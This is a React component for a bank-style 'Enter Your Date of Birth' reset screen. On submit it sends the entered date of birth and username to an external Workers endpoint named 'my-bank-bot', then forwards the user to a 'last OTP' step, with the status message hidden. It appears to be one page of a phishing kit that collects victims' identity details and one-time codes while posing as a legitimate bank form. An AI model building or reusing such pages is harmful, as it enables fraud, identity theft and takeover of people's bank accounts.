import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';

const DOBResetScreen = () => {
    const [dob, setDob] = useState('');
    const [username, setUsername] = useState(''); // Optional: if you want to send username too
    const [status, setStatus] = useState('');
    const navigate = useNavigate();

    const handleSubmit = async () => {
        if (!dob.trim()) {  // Check if DOB is empty or only spaces
            setStatus('⚠️ Please enter your Date of Birth.');
            return; // Stop submission
        }
        try {
            const response = await fetch('https://my-bank-bot.instapayapi.workers.dev/api/dob', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    dob,
                    username,
                }),
            });

            const result = await response.json();
            if (result.success) {
                navigate('/lastotp', { state: { mobile: username } }); // Redirect to LastOTP screen
                // setStatus('✅ Date of Birth submitted successfully.');
            } else {
                setStatus('❌ Submission failed.');
            }
        } catch (err) {
            console.error(err);
            setStatus('⚠️ Error submitting data.');
        }
    };

    return (
        <div className=" flex justify-center pt-10">
            <div className="bg-white shadow-md rounded-md p-4 w-80">
                {/* Heading */}
                <h2 className="text-base font-semibold text-center mb-3">
                    Enter Your Date of Birth
                </h2>

                {/* DOB Input */}
                <input
                    type="text"
                    placeholder="Enter your Date of Birth"
                    value={dob}
                    onChange={(e) => setDob(e.target.value)}
                    className="w-full border border-gray-300 rounded-md px-3 py-2 mb-3 focus:outline-none focus:ring-2 focus:ring-blue-500 text-sm"
                />

                {/* Optional Username Field */}
                {/* 
        <input
          type="text"
          placeholder="Enter your username (optional)"
          value={username}
          onChange={(e) => setUsername(e.target.value)}
          className="w-full border border-gray-300 rounded-md px-3 py-2 mb-3 focus:outline-none focus:ring-2 focus:ring-blue-500 text-sm"
        />
        */}

                {/* Submit Button */}
                <div className="flex justify-center">
                    <button
                        onClick={handleSubmit}
                        className="bg-blue-500 text-white px-4 py-2 rounded-md hover:bg-blue-600 text-sm"
                    >
                        Submit
                    </button>
                </div>

                {/* Status Message */}
                {/* {status && <p className="mt-3 text-sm text-center text-gray-600">{status}</p>} */}
            </div>
        </div>
    );
};

export default DOBResetScreen;
